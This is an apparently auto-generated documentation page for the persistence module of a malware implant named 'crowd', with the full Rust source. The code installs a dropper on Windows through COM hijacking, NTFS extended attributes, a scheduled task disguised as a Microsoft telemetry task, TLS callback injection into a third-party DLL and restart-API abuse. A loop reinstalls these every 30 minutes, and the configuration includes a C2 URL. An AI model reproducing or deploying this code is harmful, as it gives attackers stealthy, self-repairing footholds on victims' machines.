# crowd — persist/mod.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/persist/mod.rs` |
| **Lines** | 167 |
| **Cards** | T008-persistence |
| **Role** | Persistence module |

## Purpose

# crowd — persist/mod.rs

## Fase 6: Persistencia — 4 mecanismos con resilience logic

Orden de instalación: P1 → P2 → P3 → P4
Lógica de resiliencia: cada mecanismo monitorea al anterior y lo reinstala.

| Mec | Técnica | Privilegio |
|-----|---------|------------|
| P1  | COM Object Hijacking HKCU | Sin admin |
| P2  | NTFS EA (kernel32.dll.mui) | Sin admin |
| P3  | Scheduled Task via ITaskService | Sin admin (TASK_CREATE_UPDATE) |
| P4  | TLS Callback en DLL de tercero | Escritura en la DLL requerida |
| P5  | PhantomPersist: RegisterApplicationRestart + WM_QUERYENDSESSION hijack | Sin admin |

Resilience: P2 reinstala P1 en el next logon, P3 reinstala P2,
P4 reinstala P3 en cada carga de la DLL.

## Types

### struct `PersistConfig` (line 29)

## Public API

### `install_all` (line 77)
```rust
pub fn install_all(cfg: &PersistConfig) -> Vec<(&'static str, Result<()>)>
```
Instala todos los mecanismos de persistencia.
Errores individuales son ignorados (continúa con el siguiente mecanismo).

### `start_resilience_monitor` (line 128)
```rust
pub fn start_resilience_monitor(cfg: PersistConfig)
```
Activa la lógica de resiliencia (monitoreo mutuo entre mecanismos).
Llama después de `install_all`. Spawnea un hilo ligero de verificación.

## Internal Functions

- `default` (line 48)
- `should_install` — Returns true if `methods` is empty (install all) OR if `name` (or any alias) is in the list. (line 62)
- `resilience_loop` (line 134)
- `resolve_mini_dropper` (line 159)

## Key Dependencies

- `use anyhow::Result;`

## Full Source

```rust
//! # crowd — persist/mod.rs
//!
//! ## Fase 6: Persistencia — 4 mecanismos con resilience logic
//!
//! Orden de instalación: P1 → P2 → P3 → P4
//! Lógica de resiliencia: cada mecanismo monitorea al anterior y lo reinstala.
//!
//! | Mec | Técnica | Privilegio |
//! |-----|---------|------------|
//! | P1  | COM Object Hijacking HKCU | Sin admin |
//! | P2  | NTFS EA (kernel32.dll.mui) | Sin admin |
//! | P3  | Scheduled Task via ITaskService | Sin admin (TASK_CREATE_UPDATE) |
//! | P4  | TLS Callback en DLL de tercero | Escritura en la DLL requerida |
//! | P5  | PhantomPersist: RegisterApplicationRestart + WM_QUERYENDSESSION hijack | Sin admin |
//!
//! Resilience: P2 reinstala P1 en el next logon, P3 reinstala P2,
//! P4 reinstala P3 en cada carga de la DLL.

pub mod com_hijack;
pub mod ntfs_ea;
pub mod phantom_restart;
pub mod schtask;
pub mod tls_cb;

use anyhow::Result;

/// Configuración del payload mini-dropper para persistencia.
#[derive(Debug, Clone)]
pub struct PersistConfig {
    /// Path del mini-dropper en disco (o None para usar el ejecutable actual).
    pub mini_dropper_path: Option<String>,
    /// CLSID a hijackear en HKCU (e.g., "{b4bab081-ef08-11e3-848d-b8e856428d4f}")
    pub com_clsid: String,
    /// DLL de tercero con escritura permitida para TLS callback.
    pub tls_target_dll: Option<String>,
    /// URL del C2 para re-download en el mini-dropper.
    pub c2_url: String,
    /// Nombre del Scheduled Task (None = default UsbCeip)
    pub task_name: Option<String>,
    /// Nombre de la clase de ventana oculta para PhantomPersist (P5).
    /// Ofuscable en runtime. None = "CrowdMsgWnd_XQ7".
    pub phantom_window_class: Option<String>,
    /// Mechanisms to install. Empty = install all. Valid values: "com_hijack", "ntfs_ea", "schtask", "tls_cb", "phantom"
    pub methods: Vec<String>,
}

impl Default for PersistConfig {
    fn default() -> Self {
        Self {
            mini_dropper_path:     None,
            com_clsid:             "{b4bab081-ef08-11e3-848d-b8e856428d4f}".into(),
            tls_target_dll:        None,
            c2_url:                String::new(),
            task_name:             None,
            phantom_window_class:  None,
            methods:               Vec::new(),
        }
    }
}

/// Returns true if `methods` is empty (install all) OR if `name` (or any alias) is in the list.
fn should_install(methods: &[String], name: &str) -> bool {
    if methods.is_empty() {
        return true;
    }
    methods.iter().any(|m| {
        let s = m.as_str();
        s == name || match name {
            "phantom" => s == "phantom_restart",
            _ => false,
        }
    })
}

/// Instala todos los mecanismos de persistencia.
/// Errores individuales son ignorados (continúa con el siguiente mecanismo).
pub fn install_all(cfg: &PersistConfig) -> Vec<(&'static str, Result<()>)> {
    let mini_dropper = resolve_mini_dropper(&cfg.mini_dropper_path);
    let methods = &cfg.methods;
    let mut results = Vec::new();

    // P1: COM Hijack
    if should_install(methods, "com_hijack") {
        let r1 = com_hijack::install(&cfg.com_clsid, &mini_dropper);
        results.push(("COM-Hijack-HKCU", r1));
    }

    // P2: NTFS EA
    if should_install(methods, "ntfs_ea") {
        let r2 = ntfs_ea::store_dropper_path(&mini_dropper);
        results.push(("NTFS-EA", r2));
    }

    // P3: Scheduled Task
    if should_install(methods, "schtask") {
        let task = cfg.task_name.as_deref()
            .unwrap_or(r"Microsoft\Windows\Customer Experience Improvement Program\UsbCeip");
        let r3 = schtask::install_task(task, &mini_dropper);
        results.push(("ScheduledTask-COM", r3));
    }

    // P4: TLS Callback (only if DLL available)
    if should_install(methods, "tls_cb") {
        let r4 = if let Some(ref dll) = cfg.tls_target_dll {
            tls_cb::inject_tls_callback(dll, &mini_dropper)
        } else {
            Ok(())
        };
        results.push(("TLS-Callback", r4));
    }

    // P5: PhantomPersist
    if should_install(methods, "phantom") {
        let wc = cfg.phantom_window_class.as_deref();
        let r5 = if phantom_restart::install(wc) {
            Ok(())
        } else {
            Err(anyhow::anyhow!("phantom_restart::install failed"))
        };
        results.push(("PhantomPersist-RestartApps", r5));
    }

    results
}

/// Activa la lógica de resiliencia (monitoreo mutuo entre mecanismos).
/// Llama después de `install_all`. Spawnea un hilo ligero de verificación.
pub fn start_resilience_monitor(cfg: PersistConfig) {
    std::thread::spawn(move || {
        resilience_loop(&cfg);
    });
}

fn resilience_loop(cfg: &PersistConfig) {
    let mini_dropper = resolve_mini_dropper(&cfg.mini_dropper_path);
    let methods = &cfg.methods;
    loop {
        if should_install(methods, "com_hijack") && !com_hijack::is_installed(&cfg.com_clsid) {
            let _ = com_hijack::install(&cfg.com_clsid, &mini_dropper);
        }
        if should_install(methods, "ntfs_ea") && !ntfs_ea::is_installed() {
            let _ = ntfs_ea::store_dropper_path(&mini_dropper);
        }
        if should_install(methods, "schtask") {
            let task = cfg.task_name.as_deref()
                .unwrap_or(r"Microsoft\Windows\Customer Experience Improvement Program\UsbCeip");
            if !schtask::is_installed(task) {
                let _ = schtask::install_task(task, &mini_dropper);
            }
        }
        if should_install(methods, "phantom") && !phantom_restart::is_active() {
            let wc = cfg.phantom_window_class.as_deref();
            phantom_restart::install(wc);
        }
        std::thread::sleep(std::time::Duration::from_secs(30 * 60));
    }
}

fn resolve_mini_dropper(path: &Option<String>) -> String {
    if let Some(p) = path {
        return p.clone();
    }
    // Usar el ejecutable actual como mini-dropper
    std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| String::new())
}

```